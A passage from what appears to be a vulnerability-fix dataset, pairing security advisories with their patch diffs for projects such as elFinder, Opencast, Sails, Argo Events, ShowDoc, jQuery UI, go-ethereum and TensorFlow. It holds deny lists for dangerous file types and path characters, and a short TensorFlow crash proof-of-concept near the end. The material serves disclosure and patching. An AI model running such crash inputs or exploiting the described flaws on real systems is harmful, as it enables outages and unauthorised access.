repository.","published_date":"2021-06-15","chain_len":1,"project":"https:\/\/github.com\/Studio-42\/elFinder","commit_href":"https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1","commit_sha":"75ea92decc16a5daf7f618f85dc621d1b534b5e1","patch":"SINGLE","chain_ord":"['75ea92decc16a5daf7f618f85dc621d1b534b5e1']","before_first_fix_commit":"{'6a97635e590b5882bf95f62f8e70e7230bbc625e'}","last_fix_commit":"75ea92decc16a5daf7f618f85dc621d1b534b5e1","chain_ord_pos":1.0,"commit_datetime":"05\/31\/2021, 11:50:39","message":"[VD:abstract] add `'phar:*' => 'text\/x-php'` into 'staticMineMap'\n\nrel. #3295","author":"nao-pon","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'php\/elFinderVolumeDriver.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Studio-42\/elFinder\/raw\/75ea92decc16a5daf7f618f85dc621d1b534b5e1\/php%2FelFinderVolumeDriver.class.php', 'patch': \"@@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver\\n             'php5:*' => 'text\/x-php',\\n             'php7:*' => 'text\/x-php',\\n             'phtml:*' => 'text\/x-php',\\n+            'phar:*' => 'text\/x-php',\\n             'cgi:*' => 'text\/x-httpd-cgi',\\n             'pl:*' => 'text\/x-perl',\\n             'asp:*' => 'text\/x-asap',\"}}","message_norm":"[vd:abstract] add `'phar:*' => 'text\/x-php'` into 'staticminemap'\n\nrel. #3295","language":"en","entities":"[('add', 'ACTION', ''), ('#3295', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['php\/elFinderVolumeDriver.class.php'])","num_files":1.0},{"index":2780,"vuln_id":"GHSA-qm6v-cg9v-53j3","cwe_id":"{'CWE-287'}","score":5.4,"chain":"{'https:\/\/github.com\/opencast\/opencast\/commit\/8d5ec1614eed109b812bc27b0c6d3214e456d4e7'}","dataset":"osv","summary":"Limited Authentication Bypass for Media Files Prior to Opencast 10.14 and 11.7, users could pass along URLs for files belonging to organizations other than the user's own, which Opencast would then import into the current organization, bypassing organizational barriers.\n\n### Impact\n\nThe vulnerability allows attackers to bypass organizational barriers. Attackers must have full access to Opencast's ingest REST interface, and also know internal links to resources in another organization of the same Opencast cluster.\n\nIf you do not run a multi-tenant cluster, you are not affected by this issue.\n\n### Patches\n\nThis issue is fixed in Opencast 10.14 and 11.7.\n\n### References\n\n- [Patch fixing the issue](https:\/\/github.com\/opencast\/opencast\/commit\/8d5ec1614eed109b812bc27b0c6d3214e456d4e7)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [our issue tracker](https:\/\/github.com\/opencast\/opencast\/issues)\n* Email us at [security@opencast.org](mailto:security@opencast.org)","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/opencast\/opencast","commit_href":"https:\/\/github.com\/opencast\/opencast\/commit\/8d5ec1614eed109b812bc27b0c6d3214e456d4e7","commit_sha":"8d5ec1614eed109b812bc27b0c6d3214e456d4e7","patch":"SINGLE","chain_ord":"['8d5ec1614eed109b812bc27b0c6d3214e456d4e7']","before_first_fix_commit":"{'eee0c26fe33afc0709373fcbd7c6870bee8e2bed'}","last_fix_commit":"8d5ec1614eed109b812bc27b0c6d3214e456d4e7","chain_ord_pos":1.0,"commit_datetime":"05\/18\/2022, 10:43:56","message":"Merge pull request from GHSA-qm6v-cg9v-53j3\n\nThis patch fixes the issue that users can pass URLs from other tenants\nto the ingest service which will check only against the other\norganization but not against the one currently active. This allows users\nto easily ingest media from other tenants.","author":"Lars Kiesow","comments":null,"stats":"{'additions': 1, 'deletions': 12, 'total': 13}","files":"{'modules\/ingest-service-impl\/src\/main\/java\/org\/opencastproject\/ingest\/impl\/IngestServiceImpl.java': {'additions': 1, 'deletions': 12, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencast\/opencast\/raw\/8d5ec1614eed109b812bc27b0c6d3214e456d4e7\/modules%2Fingest-service-impl%2Fsrc%2Fmain%2Fjava%2Forg%2Fopencastproject%2Fingest%2Fimpl%2FIngestServiceImpl.java', 'patch': '@@ -129,15 +129,13 @@\\n import java.util.Dictionary;\\n import java.util.HashMap;\\n import java.util.HashSet;\\n-import java.util.LinkedList;\\n import java.util.List;\\n import java.util.Map;\\n import java.util.Map.Entry;\\n import java.util.Objects;\\n import java.util.Set;\\n import java.util.UUID;\\n import java.util.concurrent.TimeUnit;\\n-import java.util.stream.Collectors;\\n \\n import javax.management.ObjectInstance;\\n \\n@@ -1568,16 +1566,7 @@ protected URI addContentToRepo(MediaPackage mp, String elementId, URI uri) throw\\n     try {\\n       if (uri.toString().startsWith(\"http\")) {\\n         HttpGet get = new HttpGet(uri);\\n-        List<String> clusterUrls = new LinkedList<>();\\n-        try {\\n-          \/\/ Note that we are not checking ports here.\\n-          clusterUrls = organizationDirectoryService.getOrganization(uri.toURL()).getServers()\\n-                          .keySet()\\n-                          .stream()\\n-                          .collect(Collectors.toUnmodifiableList());\\n-        } catch (NotFoundException e) {\\n-          logger.warn(\"Unable to determine cluster members, will not be able to authenticate any downloads from them\", e);\\n-        }\\n+        var clusterUrls = securityService.getOrganization().getServers().keySet();\\n \\n         if (uri.toString().matches(downloadSource)) {\\n           \/\/NB: We\\'re creating a new client here with *different* auth than the system auth creds'}}","message_norm":"merge pull request from ghsa-qm6v-cg9v-53j3\n\nthis patch fixes the issue that users can pass urls from other tenants\nto the ingest service which will check only against the other\norganization but not against the one currently active. this allows users\nto easily ingest media from other tenants.","language":"en","entities":"[('ghsa-qm6v-cg9v-53j3', 'VULNID', 'GHSA'), ('fixes', 'ACTION', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/ingest-service-impl\/src\/main\/java\/org\/opencastproject\/ingest\/impl\/IngestServiceImpl.java'])","num_files":1.0},{"index":2783,"vuln_id":"GHSA-qmv4-jgp7-mf68","cwe_id":"{'CWE-284'}","score":0.0,"chain":"{'https:\/\/github.com\/balderdashy\/sails\/commit\/0057123a0321be6758845abbeb4290bf418ce542'}","dataset":"osv","summary":"Sails before 0.12.7 vulnerable to Broken CORS Affected versions of `sails` have an issue with the CORS configuration where the value of the origin header is reflected as the value for the `Access-Control-Allow-Origin` header. This may allow an attacker to make AJAX requests to vulnerable hosts through cross-site scripting or a malicious HTML Document, effectively bypassing the Same Origin Policy. \n\n## Mitigating Factors\n\nThis is only an issue when `allRoutes` is set to `true` and `origin` is set to `*` or left commented out in the sails CORS config file. \n\nThe problem can be compounded when the cors `credentials` setting is not provided, because at that point authenticated cross domain requests are possible.\n\n\n## Recommendation\n\nUpdate to version 0.12.7 or later.\n\nAs this vulnerability is primarily a user error, the patch for the vulnerability will simply cause the application to write an error message to the console when a vulnerable configuration is used in a production environment.\n\nWriting a proper CORS configuration is still the responsibility of the user, so it is necessary to check for the error message after installing the patch. Be sure you are not using `allRoutes: true` with `origin:'*'`, and that you uncomment `origin` and set it to a reasonable value. Ensure that if `origin` is set to `*` that you truly mean for all other websites to be able to make cross-domain requests to your API.\n\nLikewise, ensure `credentials` is uncommented out and set to the appropriate value. Make sure to explicitly set which origins may request resources via CORS.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/balderdashy\/sails","commit_href":"https:\/\/github.com\/balderdashy\/sails\/commit\/0057123a0321be6758845abbeb4290bf418ce542","commit_sha":"0057123a0321be6758845abbeb4290bf418ce542","patch":"SINGLE","chain_ord":"['0057123a0321be6758845abbeb4290bf418ce542']","before_first_fix_commit":"{'8d642f1ab3d46491cf7b73af1ec54941ff0eb84b'}","last_fix_commit":"0057123a0321be6758845abbeb4290bf418ce542","chain_ord_pos":1.0,"commit_datetime":"10\/05\/2016, 23:16:26","message":"Warn about overly-permissive CORS settings when lifting in production","author":"Scott Gress","comments":null,"stats":"{'additions': 48, 'deletions': 0, 'total': 48}","files":"{'lib\/hooks\/cors\/index.js': {'additions': 48, 'deletions': 0, 'changes': 48, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/balderdashy\/sails\/raw\/0057123a0321be6758845abbeb4290bf418ce542\/lib%2Fhooks%2Fcors%2Findex.js', 'patch': \"@@ -44,6 +44,9 @@ module.exports = function(sails) {\\n      *\/\\n     initialize: function(cb) {\\n \\n+      \/\/ Declare an array to hold info about unsafely-configured routes.\\n+      var unsafeRoutes = [];\\n+\\n       \/\/ Once it's time to bind shadow routes, get to bindin'.\\n       sails.on('router:before', function () {\\n         \/\/ (TODO: consider changing this ^^ to `sails.after()` for consistency)\\n@@ -112,10 +115,55 @@ module.exports = function(sails) {\\n               sails.log.warn('Invalid CORS settings for route '+route);\\n             }\\n \\n+            \/\/ If the global CORS defaults are not overly permissive, check this individual route's settings.\\n+            if (sails.config.cors.allRoutes === false || sails.config.cors.origin !== '*' || sails.config.cors.credentials === false) {\\n+              var routeCorsConfig = _.defaults(optionsRouteConfigs[path][verb || 'default'], sails.config.cors);\\n+              \/\/ If they are too permissive, add the route to a list of unsafe routes to warn the user about\\n+              \/\/ when running in the production environment.\\n+              if (routeCorsConfig.origin === '*' && routeCorsConfig.credentials === true) {\\n+                unsafeRoutes.push((verb ? (verb + ' ') : '') + path);\\n+              }\\n+            }\\n+\\n           }\\n \\n         });\\n \\n+        \/\/ Log a warning if your default CORS settings are super permissive in the production environment.\\n+        if (sails.config.environment === 'production') {\\n+          \/\/ If the global CORS defaults are permissive, log a warning about that.\\n+          if (\\n+            sails.config.cors.allRoutes === true &&\\n+            sails.config.cors.origin === '*' &&\\n+            sails.config.cors.credentials === true\\n+          ) {\\n+          sails.log.error('\\\\n' +\\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n' +\\n+                         'WARNING: You currently have your default CORS settings configured to allow\\\\n' +\\n+                         'all requests from all origins, with credentials.  This may leave your app\\\\n' +\\n+                         'open to attack by third-party sites!  Consider making your `origins` setting\\\\n' +\\n+                         'more restrictive or setting `credentials` to false, or else make certain that\\\\n' +\\n+                         'none of your routes perform sensitive actions or reveal secure information.\\\\n' +\\n+                         '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n');\\n+          }\\n+          \/\/ Otherwise log a warning mentioning the particular routes that are too permissive.\\n+          else if (unsafeRoutes.length) {\\n+            sails.log.error('\\\\n' +\\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n' +\\n+                           'WARNING: You currently have CORS settings on the following routes configured\\\\n' +\\n+                           'to allow all requests from all origins, with credentials:\\\\n\\\\n' + unsafeRoutes.join('\\\\n') + '\\\\n\\\\n' +\\n+                           'This may leave these routes open to attack by third-party sites!  Consider\\\\n'+\\n+                           'making the `origins` settings more restrictive or setting `credentials` to\\\\n' +\\n+                           'false, or else make certain that none of these routes perform sensitive\\\\n' +\\n+                           'actions or reveal secure information.\\\\n' +\\n+                           '=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\\\\n'\\n+                           );\\n+          }\\n+        }\\n+\\n+\\n+\\n+\\n         _.each(optionsRouteConfigs, function(config, path) {\\n           sails.router.bind('options '+path, prepareSendHeaders(config, true), null, {_middlewareType: 'CORS HOOK: preflight'});\\n         });\"}}","message_norm":"warn about overly-permissive cors settings when lifting in production","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/hooks\/cors\/index.js'])","num_files":1.0},{"index":2791,"vuln_id":"GHSA-qpgx-64h2-gc3c","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/argoproj\/argo-events\/commit\/d0f66dbce78bc31923ca057b20fc722aa24ca961'}","dataset":"osv","summary":"Insecure path traversal in Git Trigger Source can lead to arbitrary file read ### Impact\nA path traversal issue was found in the (g *GitArtifactReader).Read() API. Read() calls into (g *GitArtifactReader).readFromRepository() that opens and reads the file that contains the trigger resource definition:\n\n```go\nfunc (g *GitArtifactReader) readFromRepository(r *git.Repository, dir string)\n```\n\nNo checks are made on this file at read time, which could lead an attacker to read files anywhere on the system. This could be achieved by either using symbolic links, or putting `..\/` in the path.\n\n### Patches\nA patch for this vulnerability has been released in the following Argo Events version:\n\nv1.7.1\n\n### Credits\nDisclosed by [Ada Logics](https:\/\/adalogics.com\/) in a security audit sponsored by CNCF and facilitated by OSTIF.\n\n### For more information\nOpen an issue in the [Argo Events issue tracker](https:\/\/github.com\/argoproj\/argo-events\/issues) or [discussions](https:\/\/github.com\/argoproj\/argo-events\/discussions)\nJoin us on [Slack](https:\/\/argoproj.github.io\/community\/join-slack) in channel #argo-events","published_date":"2022-06-17","chain_len":1,"project":"https:\/\/github.com\/argoproj\/argo-events","commit_href":"https:\/\/github.com\/argoproj\/argo-events\/commit\/d0f66dbce78bc31923ca057b20fc722aa24ca961","commit_sha":"d0f66dbce78bc31923ca057b20fc722aa24ca961","patch":"SINGLE","chain_ord":"['d0f66dbce78bc31923ca057b20fc722aa24ca961']","before_first_fix_commit":"{'e80ab9f9556f7f97346fb393e312f8a689ca21f8'}","last_fix_commit":"d0f66dbce78bc31923ca057b20fc722aa24ca961","chain_ord_pos":1.0,"commit_datetime":"05\/13\/2022, 03:18:33","message":"fix: git artifactory arbitrary file read issue (#1965)\n\nSigned-off-by: Derek Wang <whynowy@gmail.com>","author":"Derek Wang","comments":null,"stats":"{'additions': 34, 'deletions': 2, 'total': 36}","files":"{'sensors\/artifacts\/git.go': {'additions': 34, 'deletions': 2, 'changes': 36, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/argoproj\/argo-events\/raw\/d0f66dbce78bc31923ca057b20fc722aa24ca961\/sensors%2Fartifacts%2Fgit.go', 'patch': '@@ -20,6 +20,8 @@ import (\\n \\t\"fmt\"\\n \\t\"io\/ioutil\"\\n \\t\"os\"\\n+\\t\"path\"\\n+\\t\"strings\"\\n \\n \\t\"github.com\/go-git\/go-git\/v5\"\\n \\t\"github.com\/go-git\/go-git\/v5\/config\"\\n@@ -44,6 +46,8 @@ var (\\n \\t\\t\"refs\/*:refs\/*\",\\n \\t\\t\"HEAD:refs\/heads\/HEAD\",\\n \\t}\\n+\\n+\\tnotAllowedInPath = []string{\"..\", \"~\", \"\\\\\\\\\"}\\n )\\n \\n type GitArtifactReader struct {\\n@@ -52,6 +56,15 @@ type GitArtifactReader struct {\\n \\n \/\/ NewGitReader returns a new git reader\\n func NewGitReader(gitArtifact *v1alpha1.GitArtifact) (*GitArtifactReader, error) {\\n+\\tif gitArtifact == nil {\\n+\\t\\treturn nil, fmt.Errorf(\"nil git artifact\")\\n+\\t}\\n+\\tfor _, na := range notAllowedInPath {\\n+\\t\\tif strings.Contains(gitArtifact.FilePath, na) {\\n+\\t\\t\\treturn nil, fmt.Errorf(\"%q is not allowed in the filepath\", na)\\n+\\t\\t}\\n+\\t}\\n+\\n \\treturn &GitArtifactReader{\\n \\t\\tartifact: gitArtifact,\\n \\t}, nil\\n@@ -176,8 +189,16 @@ func (g *GitArtifactReader) readFromRepository(r *git.Repository, dir string) ([\\n \\t\\t\\treturn nil, fmt.Errorf(\"failed to pull latest updates. err: %+v\", err)\\n \\t\\t}\\n \\t}\\n-\\n-\\treturn ioutil.ReadFile(fmt.Sprintf(\"%s\/%s\", dir, g.artifact.FilePath))\\n+\\tfilePath := fmt.Sprintf(\"%s\/%s\", dir, g.artifact.FilePath)\\n+\\t\/\/ symbol link is not allowed due to security concern\\n+\\tisSymbolLink, err := isSymbolLink(filePath)\\n+\\tif err != nil {\\n+\\t\\treturn nil, err\\n+\\t}\\n+\\tif isSymbolLink {\\n+\\t\\treturn nil, fmt.Errorf(\"%q is a symbol link which is not allowed\", g.artifact.FilePath)\\n+\\t}\\n+\\treturn ioutil.ReadFile(filePath)\\n }\\n \\n func (g *GitArtifactReader) getBranchOrTag() *git.CheckoutOptions {\\n@@ -241,3 +262,14 @@ func (g *GitArtifactReader) Read() ([]byte, error) {\\n \\t}\\n \\treturn g.readFromRepository(r, cloneDir)\\n }\\n+\\n+func isSymbolLink(filepath string) (bool, error) {\\n+\\tfi, err := os.Lstat(path.Clean(filepath))\\n+\\tif err != nil {\\n+\\t\\treturn false, err\\n+\\t}\\n+\\tif fi.Mode()&os.ModeSymlink != 0 {\\n+\\t\\treturn true, nil\\n+\\t}\\n+\\treturn false, nil\\n+}'}}","message_norm":"fix: git artifactory arbitrary file read issue (#1965)\n\nsigned-off-by: derek wang <whynowy@gmail.com>","language":"en","entities":"[('issue', 'FLAW', ''), ('#1965', 'ISSUE', ''), ('whynowy@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['sensors\/artifacts\/git.go'])","num_files":1.0},{"index":2795,"vuln_id":"GHSA-qpv2-jxc7-3638","cwe_id":"{'CWE-200'}","score":4.3,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/05c0819776b07425b2831cd31a8a0f4e7ac30c09'}","dataset":"osv","summary":"Exposure of Sensitive Information in snipe\/snipe-it Snipe-IT prior to v5.3.10 is vulnerable to Exposure of Sensitive Information to an Unauthorized Actor.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/05c0819776b07425b2831cd31a8a0f4e7ac30c09","commit_sha":"05c0819776b07425b2831cd31a8a0f4e7ac30c09","patch":"SINGLE","chain_ord":"['05c0819776b07425b2831cd31a8a0f4e7ac30c09']","before_first_fix_commit":"{'16f963fa3d7c4875e9bccf6926629efe3530d00e'}","last_fix_commit":"05c0819776b07425b2831cd31a8a0f4e7ac30c09","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2022, 23:55:42","message":"Updated language string\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'resources\/lang\/en\/passwords.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/05c0819776b07425b2831cd31a8a0f4e7ac30c09\/resources%2Flang%2Fen%2Fpasswords.php', 'patch': \"@@ -1,6 +1,6 @@\\n <?php\\n \\n return [\\n-    'sent'\\t        => 'Your password link has been sent!',\\n+    'sent'\\t        => 'Success: If that email address exists in our system, a password recovery email has been sent.',\\n     'user'\\t\\t\\t=> 'No matching active user found with that email.',\\n ];\"}}","message_norm":"updated language string\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('updated', 'ACTION', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['resources\/lang\/en\/passwords.php'])","num_files":1.0},{"index":2796,"vuln_id":"GHSA-qpw2-xchm-655q","cwe_id":"{'CWE-125'}","score":6.5,"chain":"{'https:\/\/github.com\/mhart\/StringStream\/commit\/2f4a9d496f94b0880e01a26857aa266a5a3ef274'}","dataset":"osv","summary":"Out-of-Bounds read in stringstream Versions less than 0.0.6 of the Node.js stringstream module are vulnerable to an out-of-bounds read because of allocation of uninitialized buffers when a number is passed in the input stream (when using Node.js 4.x).\n\n# WITHDRAWN\n\nThis is a duplicate of GHSA-mf6x-7mm4-x2g7","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/mhart\/StringStream","commit_href":"https:\/\/github.com\/mhart\/StringStream\/commit\/2f4a9d496f94b0880e01a26857aa266a5a3ef274","commit_sha":"2f4a9d496f94b0880e01a26857aa266a5a3ef274","patch":"SINGLE","chain_ord":"['2f4a9d496f94b0880e01a26857aa266a5a3ef274']","before_first_fix_commit":"{'1efe3bf507bf3a1161f8473908b60e881d41422b', 'afbc7442220358419e330618e47f3a65fc265b1b'}","last_fix_commit":"2f4a9d496f94b0880e01a26857aa266a5a3ef274","chain_ord_pos":1.0,"commit_datetime":"05\/17\/2018, 10:22:09","message":"Merge pull request #9 from mhart\/fix-buffer-constructor-vuln\n\nEnsure data is not a number in Buffer constructor","author":"Michael Hart","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'stringstream.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mhart\/StringStream\/raw\/2f4a9d496f94b0880e01a26857aa266a5a3ef274\/stringstream.js', 'patch': \"@@ -28,7 +28,7 @@ StringStream.prototype.write = function(data) {\\n     return false\\n   }\\n   if (this.fromEncoding) {\\n-    if (Buffer.isBuffer(data)) data = data.toString()\\n+    if (Buffer.isBuffer(data) || typeof data === 'number') data = data.toString()\\n     data = new Buffer(data, this.fromEncoding)\\n   }\\n   var string = this.decoder.write(data)\"}}","message_norm":"merge pull request #9 from mhart\/fix-buffer-constructor-vuln\n\nensure data is not a number in buffer constructor","language":"en","entities":"[('#9', 'ISSUE', ''), ('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['stringstream.js'])","num_files":1.0},{"index":2799,"vuln_id":"GHSA-qq74-vgcf-54c3","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/e5d575928b1371a7e07b09b6592822298335062a'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting via viva cshtm file upload in in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/e5d575928b1371a7e07b09b6592822298335062a","commit_sha":"e5d575928b1371a7e07b09b6592822298335062a","patch":"SINGLE","chain_ord":"['e5d575928b1371a7e07b09b6592822298335062a']","before_first_fix_commit":"{'ba45d19e1d77a7eea866dab30eff5da552694891'}","last_fix_commit":"e5d575928b1371a7e07b09b6592822298335062a","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 05:07:40","message":"bug","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/e5d575928b1371a7e07b09b6592822298335062a\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -311,6 +311,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \".asa\")\\n \\t\\t\\t|| $isDangerStr($filename , \".cshtml\")\\n \\t\\t\\t|| $isDangerStr($filename , \".axd\")\\n+\\t\\t\\t|| $isDangerStr($filename , \"htm\")\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}'}}","message_norm":"bug","language":"id","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":2805,"vuln_id":"GHSA-qqxp-xp9v-vvx6","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/jquery\/jquery-ui\/commit\/f2854408cce7e4b7fc6bf8676761904af9c96bde', 'https:\/\/github.com\/jquery\/jquery-ui\/commit\/5fee6fd5000072ff32f2d65b6451f39af9e0e39e'}","dataset":"osv","summary":"Moderate severity vulnerability that affects jquery-ui Cross-site scripting (XSS) vulnerability in the default content option in jquery.ui.tooltip.js in the Tooltip widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title attribute, which is not properly handled in the autocomplete combo box demo.","published_date":"2017-10-24","chain_len":2,"project":"https:\/\/github.com\/jquery\/jquery-ui","commit_href":"https:\/\/github.com\/jquery\/jquery-ui\/commit\/5fee6fd5000072ff32f2d65b6451f39af9e0e39e","commit_sha":"5fee6fd5000072ff32f2d65b6451f39af9e0e39e","patch":"MULTI","chain_ord":"['5fee6fd5000072ff32f2d65b6451f39af9e0e39e', 'f2854408cce7e4b7fc6bf8676761904af9c96bde']","before_first_fix_commit":"{'5fee6fd5000072ff32f2d65b6451f39af9e0e39e'}","last_fix_commit":"f2854408cce7e4b7fc6bf8676761904af9c96bde","chain_ord_pos":1.0,"commit_datetime":"11\/27\/2012, 15:52:19","message":"Autocomplete demo: Combobox: Encode search term inside tooltips. Fixes #8859 - Autocomplete: XSS in combobox demo.","author":"Scott Gonz\u00e1lez","comments":"{'com_1': {'author': 'jzaefferer', 'datetime': '11\/27\/2012, 16:05:23', 'body': \"Doesn't this just hide the underlying tooltip vulnerability? If so, tooltip would have to use `.text()` instead of `.html()`, and make it sane to override that.\"}, 'com_2': {'author': 'scottgonzalez', 'datetime': '11\/27\/2012, 16:13:04', 'body': \"hmm...yeah, tooltip should handle this in the default `content` option. Good catch, I'll fix that.\"}, 'com_3': {'author': 'scottgonzalez', 'datetime': '11\/27\/2012, 16:22:17', 'body': 'Fixed in f2854408cce7e4b7fc6bf8676761904af9c96bde.'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'demos\/autocomplete\/combobox.html': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jquery\/jquery-ui\/raw\/5fee6fd5000072ff32f2d65b6451f39af9e0e39e\/demos%2Fautocomplete%2Fcombobox.html', 'patch': '@@ -61,7 +61,7 @@\\n \\t\\t\\t\\t\\t\\t\/\/ remove invalid value, as it didn\\'t match anything\\n \\t\\t\\t\\t\\t\\t$( element )\\n \\t\\t\\t\\t\\t\\t\\t.val( \"\" )\\n-\\t\\t\\t\\t\\t\\t\\t.attr( \"title\", value + \" didn\\'t match any item\" )\\n+\\t\\t\\t\\t\\t\\t\\t.attr( \"title\", $( \"<a>\" ).text( value ).html() + \" didn\\'t match any item\" )\\n \\t\\t\\t\\t\\t\\t\\t.tooltip( \"open\" );\\n \\t\\t\\t\\t\\t\\tselect.val( \"\" );\\n \\t\\t\\t\\t\\t\\tsetTimeout(function() {'}}","message_norm":"autocomplete demo: combobox: encode search term inside tooltips. fixes #8859 - autocomplete: xss in combobox demo.","language":"pt","entities":"[('encode', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#8859', 'ISSUE', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['demos\/autocomplete\/combobox.html'])","num_files":1.0},{"index":2807,"vuln_id":"GHSA-qr2j-wrhx-4829","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/ethereum\/go-ethereum\/commit\/106d196ec4a6451efedc60ab15957f231fa85639'}","dataset":"osv","summary":"Improper Input Validation In Go Ethereum (aka geth) before 1.8.14, TraceChain in eth\/api_tracer.go does not verify that the end block is after the start block.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/ethereum\/go-ethereum","commit_href":"https:\/\/github.com\/ethereum\/go-ethereum\/commit\/106d196ec4a6451efedc60ab15957f231fa85639","commit_sha":"106d196ec4a6451efedc60ab15957f231fa85639","patch":"SINGLE","chain_ord":"['106d196ec4a6451efedc60ab15957f231fa85639']","before_first_fix_commit":"{'6d1e292eefa70b5cb76cd03ff61fc6c4550d7c36'}","last_fix_commit":"106d196ec4a6451efedc60ab15957f231fa85639","chain_ord_pos":1.0,"commit_datetime":"08\/21\/2018, 07:48:53","message":"eth: ensure from<to when tracing chain (credits Chen Nan via bugbounty)","author":"Martin Holst Swende","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'eth\/api_tracer.go': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ethereum\/go-ethereum\/raw\/106d196ec4a6451efedc60ab15957f231fa85639\/eth%2Fapi_tracer.go', 'patch': '@@ -119,6 +119,9 @@ func (api *PrivateDebugAPI) TraceChain(ctx context.Context, start, end rpc.Block\\n \\tif to == nil {\\n \\t\\treturn nil, fmt.Errorf(\"end block #%d not found\", end)\\n \\t}\\n+\\tif from.Number().Cmp(to.Number()) >= 0 {\\n+\\t\\treturn nil, fmt.Errorf(\"end block (#%d) needs to come after start block (#%d)\", end, start)\\n+\\t}\\n \\treturn api.traceChain(ctx, from, to, config)\\n }'}}","message_norm":"eth: ensure from<to when tracing chain (credits chen nan via bugbounty)","language":"en","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['eth\/api_tracer.go'])","num_files":1.0},{"index":2811,"vuln_id":"GHSA-qr82-2c78-4m8h","cwe_id":"{'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/532f5c5a547126c634fefd43bbad1dc6417678ac'}","dataset":"osv","summary":"Reference binding to nullptr in map operations ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.Map*` and `tf.raw_ops.OrderedMap*` operations:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapPeek(\n  key=tf.constant([8],dtype=tf.int64),\n  indices=[],\n  dtypes=[tf.int32],\n  capacity=8,\n  memory_limit=128)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/map_stage_op.cc#L222-L248) has a check 